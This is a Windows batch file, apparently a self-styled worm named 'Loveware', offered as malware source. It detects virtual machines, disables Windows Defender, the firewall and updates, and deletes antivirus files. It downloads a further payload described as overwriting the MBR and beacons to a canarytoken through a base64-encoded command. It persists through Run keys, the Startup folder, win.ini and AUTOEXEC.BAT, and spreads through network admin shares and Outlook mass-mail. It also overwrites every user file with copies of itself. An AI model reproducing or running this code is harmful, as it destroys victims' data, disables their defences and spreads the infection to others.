@echo off
::    ,--,                                                                           
::  ,---.'|                                                                           
::  |   | :                                                                           
::  :   : |                                                                           
::  |   ' :      ,---.                              .---.             __  ,-.         
::  ;   ; '     '   ,'\      .---.                 /. ./|           ,' ,'/ /|         
::  '   | |__  /   /   |   /.  ./|  ,---.       .-'-. ' |  ,--.--.  '  | |' | ,---.   
::  |   | :.'|.   ; ,. : .-' . ' | /     \     /___/ \: | /       \ |  |   ,'/     \  
::  '   :    ;'   | |: :/___/ \: |/    /  | .-'.. '   ' ..--.  .-. |'  :  / /    /  | 
::  |   |  ./ '   | .; :.   \  ' .    ' / |/___/ \:     ' \__\/: . .|  | ' .    ' / | 
::  ;   : ;   |   :    | \   \   '   ;   /|.   \  ' .\    ," .--.; |;  : | '   ;   /| 
::  |   ,/     \   \  /   \   \  '   |  / | \   \   ' \ |/  /  ,.  ||  , ; '   |  / | 
::  '---'       `----'     \   \ |   :    |  \   \  |--";  :   .'   \---'  |   :    | 
::                          '---" \   \  /    \   \ |   |  ,     .-./       \   \  /  
::                                 `----'      '---"     `--`---'            `---  
::
::                                                                         

color 35

title Loveware

:: Detect if program is running in virtualmachine

FOR /F "tokens=* USEBACKQ" %%F IN (`PowerShell.exe -command " (gwmi Win32_BaseBoard).Manufacturer -eq 'Microsoft Corporation' "`) DO (
SET check=%%F
)
echo %check%

if %check% == False (
    echo Dim WshShell, BtnCode>C:\Windows\ifvm.vbs
    echo Set WshShell = WScript.CreateObject("WScript.Shell")>>C:\Windows\ifvm.vbs
    echo BtnCode = WshShell.Popup("Could not start process!",2+48,"Taskmanager")>>C:\Windows\ifvm.vbs
    echo Select Case BtnCode>>C:\Windows\ifvm.vbs
    echo case 3 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo case 4 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo case 5 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo End Select>>C:\Windows\ifvm.vbs
    start C:\Windows\ifvm.vbs
    pause
    exit
) else (
    goto valentine

:valentine

for /f "skip=1" %%x in ('wmic os get localdatetime') do if not defined MyDate set MyDate=%%x
for /f %%x in ('wmic path win32_localtime get /format:list ^| findstr "="') do set %%x

set today=%Year%

for /f "delims=" %%a in ('c:\date.exe +%%w') do set DayOfWeek=%%a
if %DayOfWeek% == 14-02-%Year% (
    msg * Happy Valentine!!!
    pause
    exit
) else (
    goto :admin
)

:: Only run as admin function

:admin

net session >nul 2>&1

if %errorLevel% == 0 (
    goto runner
) else (
    echo msgbox("Please run as admin",0+64,"Admin") > C:\Windows\Admin.vbs
    start C:\Windows\Admin.vbs
    pause
    exit
)

:runner

net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
netsh firewall set opmode mode-disable
net stop "wuauserv"
net stop "Windows Defender Service"
net stop "Windows Firewall"
net stop sharedaccess

del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.dat
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*

:: Change file name to Loveware

RENAME %0 Loveware.exe

:: Move Loveware to the windows directory

MOVE /e /y Loveware.exe C:\Windows

:: Download file that will overwrite the mbr

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/TheG0df2ther/Loveware/master/Loveware/FinalPayload/FinalPayload.exe', 'SomeHugs.exe')"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/TheG0df2ther/Loveware/master/Loveware/FinalPayload/FinalPayload.exe -OutFile SomeHugs.exe"

:: Copy SomeHugs.exe to the startup folder to prevent
:: people from escaping death.

XCOPY "%USERPROFILE%\Downloads\SomeHugs.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Goto canarytoken link that will add the infected by Loveware user to the Loveware Infected map.
:: Loveware infected map: https://canarytokens.org/manage?token=h8blu81q8j2vzu825fmpzut7r&auth=e8be20c708872b669cd4562d35b5abf7

PowerShell.exe -command "Set-ExecutionPolicy Unrestricted"

echo set "base64string=c3RhcnQgL21pbiBodHRwOi8vY2FuYXJ5dG9rZW5zLmNvbS90YWdzL3Rlcm1zL2g4Ymx1ODFxOGoydnp1ODI1Zm1wenV0N3IvY29udGFjdC5waHA=">>Canary.ps1
echo for /f "tokens=* delims=" %%# in ('powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""%base64string%"""^)^)') do set "decoded=%%#">>Canary.ps1

echo echo %decoded% | Out-File -FilePath C:\Windows\Canary.bat -Force>>Canary.ps1

start /min Canary.ps1

timeout 8

start /min Canary.bat

:: Copy Loveware to the startup

XCOPY "Loveware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Infect network connected computers

@echo off > service.bat
SET "NomeProcesso=Loveware.exe" >> service.bat
SET "NomeService=Loveware" >> service.bat
echo sc create %NomeService% binpath=%0 >> service.bat
echo sc start %NomeService% >> service.bat

attrib +h +r +s service.bat
start service.bat

SET i=0

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
attrib +h +r +s %0

:Internet
net use Z: \\192.168.1.%i%\C$
if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
mountvol Z: /d)
if %i% == 256 (goto Infect) else (set /a i=i+1)
goto worm
goto Internet

:Infect
for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.exe)
for /f %%f in ('dir C:\Users\*.exe /s /b') do (copy %0 %%f)
goto Infect

:: Send Loveware to all the contacts of the user
:: with outlook

:worm

set Slash=\
if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
del %SystemDrive%%Slash%AUTOEXEC.BAT
copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
)
set a=Loveware
copy %0 %windir%\%a%.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.exe /f > nul
set b=Loveware
copy %0 %windir%\%b%.exe
echo [windows] >> %windir%\win.ini
echo run=%windir%\%b%.exe >> %windir%\win.ini
echo load=%windir%\%b%.exe >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe %b%.exe >> %windir%\system.ini
echo dim x>>%SystemDrive%\mail.vbs
echo on error resume next>>%SystemDrive%\mail.vbs
echo Set fso ="Scripting.FileSystem.Object">>%SystemDrive%\mail.vbs
echo Set so=CreateObject(fso)>>%SystemDrive%\mail.vbs
echo Set ol=CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>%SystemDrive%\mail.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>%SystemDrive%\mail.vbs
echo Set a = mapi.AddressLists(1)>>%SystemDrive%\mail.vbs
echo Set ae=a.AddressEntries>>%SystemDrive%\mail.vbs
echo For x=1 To ae.Count>>%SystemDrive%\mail.vbs
echo Set ci=ol.CreateItem(0)>>%SystemDrive%\mail.vbs
echo Set Mail=ci>>%SystemDrive%\mail.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs
echo Mail.Subject="Is this you?">>%SystemDrive%\mail.vbs
echo Mail.Body="Man that has got to be embarrassing!">>%SystemDrive%\mail.vbs
echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs
echo Mail.send>>%SystemDrive%\mail.vbs
echo Next>>%SystemDrive%\mail.vbs
echo ol.Quit>>%SystemDrive%\mail.vbs
start "" "%SystemDrive%\mail.vbs"

goto run2

goto worm